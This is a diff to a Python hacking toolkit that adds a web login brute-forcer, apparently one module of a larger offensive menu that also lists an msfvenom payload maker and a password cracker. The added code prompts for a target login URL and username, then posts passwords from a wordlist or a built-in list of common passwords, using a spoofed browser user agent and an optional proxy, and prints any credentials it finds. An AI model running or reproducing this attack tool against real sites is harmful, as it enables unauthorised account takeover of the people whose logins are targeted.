@@ -16,6 +16,9 @@ from os import system as command
 from time import sleep as wait
 import requests
 import shutil
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse
+
 command("clear")
 def slow_print(text, delay=0.08):
     for char in text:
@@ -23,6 +26,15 @@ def slow_print(text, delay=0.08):
         sys.stdout.flush()
         time.sleep(delay)
     print()
+class C:
+    PURPLE = '\033[95m'
+    BLUE   = '\033[94m'
+    CYAN   = '\033[96m'
+    GREEN  = '\033[92m'
+    YELLOW = '\033[93m'
+    RED    = '\033[91m'
+    BOLD   = '\033[1m'
+    END    = '\033[0m'
 port_banner = """
 ⠀⠀⠀⠀⠀⠀        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠓⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠈⠓⠢⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣫⠂⠘⠁⠀⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -136,6 +148,7 @@ hashr -> hash text
 msfv -> msfveom payload maker
 mtrx -> matrix screen saver thing 
 tcpserver -> basic tcp server
+webrute -> basic longin brute force
 clear -> clear screen
 exit -> exit
 """
@@ -246,6 +259,133 @@ def hashr():
     else:
         digest = algorithms[algorithm](text.encode("utf-8")).hexdigest()
         print(f"{algorithm}: {digest}")
+
+def web_brute():
+    ASCII_ART = r"""
+                _                        
+                \`*-.                    
+                )  _`-.                 
+                .  : `. .                
+                : _   '  \               
+                ; *` _.   `*-._          
+                `-.-'          `-.       
+                ;       `       `.     
+                :.       .        \    
+                . \  .   :   .-'   .   
+                '  `+.;  ;  '      :   
+                :  '  |    ;       ;-. 
+                ; '   : :`-:     _.`* ;
+    [password] .*' /  .*' ; .*`- +'  `*' 
+               `*-*   `*-*  `*-*'
+    """
+    TOP10 = [
+        "123456", "password", "12345678", "qwerty", "123456789",
+        "12345", "1234", "111111", "1234567", "dragon"
+    ]
+    def banner():
+        print(f"{C.PURPLE}{ASCII_ART}{C.END}")
+        print(f"{C.CYAN}{C.BOLD}{'='*50}{C.END}")
+        print(f"{C.CYAN}{C.BOLD}  WEB LOGIN BRUTE FORCER v1.0{C.END}")
+        print(f"{C.YELLOW}   part of the catware tool :3{C.END}")
+        print(f"{C.CYAN}{C.BOLD}{'='*50}{C.END}\n")
+    def ask(prompt, default=None):
+        if default:
+            val = input(f"{C.CYAN}[?]{C.END} {prompt} [{default}]: ").strip()
+            return val if val else default
+        return input(f"{C.CYAN}[?]{C.END} {prompt}: ").strip()
+    def load_wordlist(path):
+        try:
+            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                return [line.strip() for line in f if line.strip()]
+        except Exception as e:
+            print(f"{C.RED}[!] Failed to read wordlist: {e}{C.END}")
+            sys.exit(1)
+    def try_login(session, url, data, fail_txt, success_txt, proxies):
+        try:
+            r = session.post(url, data=data, proxies=proxies, timeout=15, allow_redirects=True)
+            text = r.text.lower()
+
+            if success_txt and success_txt.lower() in text:
+                return True, r.status_code
+            if fail_txt.lower() in text:
+                return False, r.status_code
+            if r.history or len(text) < len(fail_txt)*2:
+                return True, r.status_code
+            return False, r.status_code
+        except requests.RequestException as e:
+            return None, str(e)
+    def main():
+        banner()
+        url      = ask("Enter the target login URL (e.g. http://site.com/login)")
+        username = ask("Enter the username to brute force")
+        wordlist_path = ask("Path to password wordlist (leave blank for top 10 defaults)", "")
+        if wordlist_path:
+            passwords = load_wordlist(wordlist_path)
+            print(f"{C.BLUE}[*] Loaded {C.BOLD}{len(passwords)}{C.END}{C.BLUE} passwords from wordlist{C.END}")
+        else:
+            passwords = TOP10
+            print(f"{C.YELLOW}[*] No wordlist provided. Using top {len(passwords)} common passwords.{C.END}")
+        uf = ask("Username form field name", "username")
+        pf = ask("Password form field name", "password")
+        fail_txt = ask("Failure indicator text on page (case-insensitive)", "invalid")
+        success_txt = ask("Success indicator text (optional, press Enter to skip)", "")
+        delay = float(ask("Delay between requests in seconds", "0.3"))
+        proxy = ask("Proxy URL (optional, e.g. http://127.0.0.1:8080)", "")
+        print(f"\n{C.BLUE}[*] Target URL : {C.BOLD}{url}{C.END}")
+        print(f"{C.BLUE}[*] Username   : {C.BOLD}{username}{C.END}")
+        print(f"{C.BLUE}[*] User field : {C.BOLD}{uf}{C.END}  |  Pass field : {C.BOLD}{pf}{C.END}")
+        print(f"{C.BLUE}[*] Fail text  : '{C.BOLD}{fail_txt}{C.END}{C.BLUE}'{C.END}")
+        if success_txt:
+            print(f"{C.BLUE}[*] Success txt: '{C.BOLD}{success_txt}{C.END}{C.BLUE}'{C.END}")
+        print(f"{C.BLUE}[*] Delay      : {C.BOLD}{delay}s{C.END}{C.BLUE} per attempt{C.END}")
+        if proxy:
+            print(f"{C.BLUE}[*] Proxy      : {C.BOLD}{proxy}{C.END}")
+        confirm = ask("\nStart attack?", "Y").lower()
+        if confirm not in ("y", "yes"):
+            print(f"{C.YELLOW}[!] Aborted.{C.END}")
+            sys.exit(0)
+        print(f"{C.CYAN}\n{'─'*50}{C.END}\n")
+        proxies = {"http": proxy, "https": proxy} if proxy else None
+        session = requests.Session()
+        session.headers.update({
+            "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                        "AppleWebKit/537.36 (KHTML, like Gecko) "
+                        "Chrome/115.0.0.0 Safari/537.0")
+        })
+        found = False
+        total = len(passwords)
+        for i, pwd in enumerate(passwords, 1):
+            print(f"{C.CYAN}[{i:0{len(str(total))}}/{total}] {C.END}Trying: {C.BOLD}{pwd:<20}{C.END}", end=" ", flush=True)
+            data = {uf: username, pf: pwd}
+            result, info = try_login(session, url, data, fail_txt, success_txt, proxies)
+            if result is None:
+                print(f"{C.RED}[ERR: {info}]{C.END}")
+                continue
+            if result:
+                print(f"{C.GREEN}[SUCCESS!]{C.END}")
+                print(f"\n{C.GREEN}{'='*50}{C.END}")
+                print(f"{C.GREEN}{C.BOLD}  CREDENTIALS FOUND{C.END}")
+                print(f"{C.GREEN}  ────────────────{C.END}")
+                print(f"{C.GREEN}  Username : {username}{C.END}")
+                print(f"{C.GREEN}  Password : {pwd}{C.END}")
+                print(f"{C.GREEN}{'='*50}{C.END}\n")
+                found = True
+                break
+            else:
+                print(f"{C.RED}[FAIL]{C.END}")
+            if delay > 0:
+                time.sleep(delay)
+        if not found:
+            print(f"\n{C.RED}{C.BOLD}[!] Exhausted all passwords. No match found.{C.END}\n")
+    if __name__ == "__main__":
+        try:
+            main()
+        except KeyboardInterrupt:
+            print(f"\n{C.YELLOW}[!] Aborted by user.{C.END}")
+            sys.exit(0)
+        except Exception as e:
+            print(f"\n{C.RED}[!] Unexpected error: {e}{C.END}")
+            sys.exit(1)
 
 def dirf():
     os.system("clear" if os.name != "nt" else "cls")
@@ -705,6 +845,8 @@ while True:
         tcpserver()
     elif opt == "clear":
         clr()
+    elif opt == "webrute":
+        web_brute()
     elif opt == "crack":
         cracker()
     elif opt == "compile":
